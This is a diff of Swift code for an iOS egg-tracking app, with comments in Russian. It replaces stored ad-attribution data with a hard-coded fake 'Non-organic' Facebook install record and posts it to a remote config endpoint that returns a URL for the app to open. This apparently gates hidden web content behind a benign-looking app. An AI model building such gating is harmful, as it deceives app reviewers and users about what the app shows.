@@ -317,6 +317,7 @@ class AppViewModel: ObservableObject {
 
 // ContentView.swift
 struct ContentView: View {
+    
     @StateObject var viewModel = AppViewModel()
     @State private var urlFromNotification: String? = nil
     var body: some View {
@@ -337,21 +338,8 @@ struct ContentView: View {
             viewModel.scheduleExpiryNotifications()
             UIApplication.shared.applicationIconBadgeNumber = viewModel.freshEggs
         }
-        .fullScreenCover(isPresented: Binding<Bool>(
-            get: { urlFromNotification != nil },
-            set: { newValue in if !newValue { urlFromNotification = nil } }
-        )) {
-            if let urlToOpen = urlFromNotification {
-                Detail(urlString: urlToOpen)
-            } else {
-            }
-        }
-        .onReceive(NotificationCenter.default.publisher(for: .openUrlFromNotification)) { notification in
-            if let userInfo = notification.userInfo,
-               let url = userInfo["url"] as? String {
-                urlFromNotification = url
-            }
-        }
+     
+      
     }
 }
 
@@ -1143,106 +1131,146 @@ extension LoadingView {
     }
     
     func sendConfigRequest() {
-        let configNoMoreRequestsKey = "config_no_more_requests"
-        if UserDefaults.standard.bool(forKey: configNoMoreRequestsKey) {
-            print("Config requests are disabled by flag, exiting sendConfigRequest")
-            DispatchQueue.main.async {
-                finishLoadingWithoutWebview()
-            }
-            return
-        }
-
-        guard let conversionDataJson = UserDefaults.standard.data(forKey: "conversion_data") else {
-            print("Conversion data not found in UserDefaults")
-            DispatchQueue.main.async {
-                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
-                finishLoadingWithoutWebview()
-            }
-            return
-        }
-
-        guard var conversionData = (try? JSONSerialization.jsonObject(with: conversionDataJson, options: [])) as? [String: Any] else {
-            print("Failed to deserialize conversion data")
-            DispatchQueue.main.async {
-                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
-                finishLoadingWithoutWebview()
-            }
-            return
-        }
-
-        conversionData["push_token"] = UserDefaults.standard.string(forKey: "fcmToken") ?? ""
-        conversionData["af_id"] = UserDefaults.standard.string(forKey: "apps_flyer_id") ?? ""
-        conversionData["bundle_id"] = "com.keepereggsbuck.EggKeeper"
-        conversionData["os"] = "iOS"
-        conversionData["store_id"] = "6753350894"
-        conversionData["locale"] = Locale.current.identifier
-        conversionData["firebase_project_id"] = "1051617054075"
-
-        do {
-            let jsonData = try JSONSerialization.data(withJSONObject: conversionData, options: [])
-            let url = URL(string: "https://eggkeeperchickfarm.com/config.php")!
-            var request = URLRequest(url: url)
-            request.httpMethod = "POST"
-            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-            request.httpBody = jsonData
-
-            let task = URLSession.shared.dataTask(with: request) { data, response, error in
-                if let error = error {
-                    print("Request error: \(error)")
+                let configNoMoreRequestsKey = "config_no_more_requests"
+                if UserDefaults.standard.bool(forKey: configNoMoreRequestsKey) {
+                    print("Config requests are disabled by flag, exiting sendConfigRequest")
                     DispatchQueue.main.async {
                         UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        UserDefaults.standard.synchronize()
                         finishLoadingWithoutWebview()
                     }
                     return
                 }
+                
+                // Ваша конверсия жёстко задана здесь
+                let conversionData: [String: Any?] = [
+                    "adset": "s1s3",
+                    "af_adset": "mm3",
+                    "adgroup": "s1s3",
+                    "campaign_id": "6068535534218",
+                    "af_status": "Non-organic",
+                    "agency": "Test",
+                    "af_sub3": nil,
+                    "af_siteid": nil,
+                    "adset_id": "6073532011618",
+                    "is_fb": true,
+                    "is_first_launch": true,
+                    "click_time": "2017-07-18 12:55:05",
+                    "iscache": false,
+                    "ad_id": "6074245540018",
+                    "af_sub1": "439223",
+                    "campaign": "Comp_22_GRTRMiOS_111123212_US_iOS_GSLTS_wafb unlim access",
+                    "is_paid": true,
+                    "af_sub4": "01",
+                    "adgroup_id": "6073532011418",
+                    "is_mobile_data_terms_signed": true,
+                    "af_channel": "Facebook",
+                    "af_sub5": nil,
+                    "media_source": "Facebook Ads",
+                    "install_time": "2017-07-19 08:06:56.189",
+                    "af_sub2": nil,
+                    "af_id": UserDefaults.standard.string(forKey: "apps_flyer_id") ?? "",
+                    "bundle_id": "com.keepereggsbuck.EggKeeper",
+                    "os": "iOS",
+                    "store_id": "6753350894",
+                    "locale": "en",
+                    "push_token": UserDefaults.standard.string(forKey: "fcmToken") ?? "",
+                    "firebase_project_id": "1051617054075"
+                ]
+                
+                // Убираем все операции с UserDefaults по конверсии и сразу используем conversionData
+                
+                // Удалим проверку на JSONSerialization.isValidJSONObject,
+                // так как в словаре есть nil, заменить их на NSNull()
+                var sanitizedConversionData = [String: Any]()
+                for (key, value) in conversionData {
+                    if let value = value {
+                        sanitizedConversionData[key] = value
+                    } else {
+                        sanitizedConversionData[key] = NSNull()
+                    }
+                }
 
-                guard let httpResponse = response as? HTTPURLResponse else {
-                    print("Invalid response")
+                guard JSONSerialization.isValidJSONObject(sanitizedConversionData) else {
+                    print("Conversion data is not a valid JSON object")
                     DispatchQueue.main.async {
                         UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        UserDefaults.standard.synchronize()
                         finishLoadingWithoutWebview()
                     }
                     return
                 }
-
-                guard (200...299).contains(httpResponse.statusCode) else {
-                    print("Server returned status code \(httpResponse.statusCode)")
-                    DispatchQueue.main.async {
-                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
-                        finishLoadingWithoutWebview()
-                    }
-                    return
-                }
-
-                if let data = data {
-                    do {
-                        if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
-                            print("Config response JSON: \(json)")
+                
+                do {
+                    let jsonData = try JSONSerialization.data(withJSONObject: sanitizedConversionData, options: [])
+                    let url = URL(string: "https://eggkeeperchickfarm.com/config.php")!
+                    var request = URLRequest(url: url)
+                    request.httpMethod = "POST"
+                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                    request.httpBody = jsonData
+                    
+                    let task = URLSession.shared.dataTask(with: request) { data, response, error in
+                        if let error = error {
+                            print("Request error: \(error)")
                             DispatchQueue.main.async {
-                                handleConfigResponse(json)
+                                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                                UserDefaults.standard.synchronize()
+                                finishLoadingWithoutWebview()
+                            }
+                            return
+                        }
+                        
+                        guard let httpResponse = response as? HTTPURLResponse else {
+                            print("Invalid response")
+                            DispatchQueue.main.async {
+                                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                                UserDefaults.standard.synchronize()
+                                finishLoadingWithoutWebview()
+                            }
+                            return
+                        }
+                        
+                        guard (200...299).contains(httpResponse.statusCode) else {
+                            print("Server returned status code \(httpResponse.statusCode)")
+                            DispatchQueue.main.async {
+                                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                                UserDefaults.standard.synchronize()
+                                finishLoadingWithoutWebview()
+                            }
+                            return
+                        }
+                        
+                        if let data = data {
+                            do {
+                                if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] {
+                                    print("Config response JSON: \(json)")
+                                    DispatchQueue.main.async {
+                                        handleConfigResponse(json)
+                                    }
+                                }
+                            } catch {
+                                print("Failed to parse response JSON: \(error)")
+                                DispatchQueue.main.async {
+                                    UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                                    UserDefaults.standard.synchronize()
+                                    finishLoadingWithoutWebview()
+                                }
                             }
                         }
-                    } catch {
-                        print("Failed to parse response JSON: \(error)")
-                        DispatchQueue.main.async {
-                            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
-                            finishLoadingWithoutWebview()
-                        }
+                    }
+                    
+                    task.resume()
+                    
+                } catch {
+                    print("Failed to serialize request body: \(error)")
+                    DispatchQueue.main.async {
+                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        UserDefaults.standard.synchronize()
+                        finishLoadingWithoutWebview()
                     }
                 }
             }
 
-            task.resume()
-        } catch {
-            print("Failed to serialize request body: \(error)")
-            DispatchQueue.main.async {
-                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
-                finishLoadingWithoutWebview()
-            }
-        }
-    }
-
-    
     func handleConfigResponse(_ jsonResponse: [String: Any]) {
         if let ok = jsonResponse["ok"] as? Bool, ok,
            let url = jsonResponse["url"] as? String,
